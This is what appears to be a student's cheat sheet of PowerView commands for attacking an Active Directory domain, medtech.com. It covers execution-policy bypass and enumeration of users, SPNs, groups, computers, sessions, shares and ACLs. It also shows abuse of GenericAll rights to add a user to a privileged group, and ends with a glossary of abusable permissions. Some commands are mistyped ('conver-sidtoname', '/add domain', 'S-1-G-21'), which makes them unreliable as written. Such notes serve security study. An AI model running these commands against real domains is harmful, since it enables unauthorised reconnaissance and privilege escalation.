powershell -ep bypass
import-module .\PowerView.ps1

get-netdomain

get-netuser | select samaccountname,pwdlastset,lastlogon
Get-NetUser -Domain medtech.com |select name, samaccountname, serviceprincipalname
get-netuser -spn | select samaccountname,serviceprincipalname

get-netgroup |select samaccountname
get-netgroup "some group" | select member
get-netuser | select samaccountname,pwdlastset,lastlogon

Get-NetComputer | select operatingsystem, dnshostname
get-netcomputer "computer name" -verbose

find-localadminaccess

get-netsession -computername |select cn
get-netsession -computername "computer name"

c

(enumerate ACEs)
get-objectacl -identity <username>
(find out who has the ReadProperty permission. need to convert the SecurityIdentifier value) 
conver-sidtoname s-1-5-21-......

Find-InterestingDomainAcl

(enumerate a group to find any user with GenericAll)
Get-ObjectAcl -Identity "group name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
get-objectacl -identity "jen" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
* S-1-G-21-..........-512 belongs to an admin account

(add our user to the domain)
net group "Management Department" jen /add domain
(verify)
Get-NetGroup "Management Department" | select member

(domain shares)
find-domainshare -checkshareaccess

ACL (access control list)
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group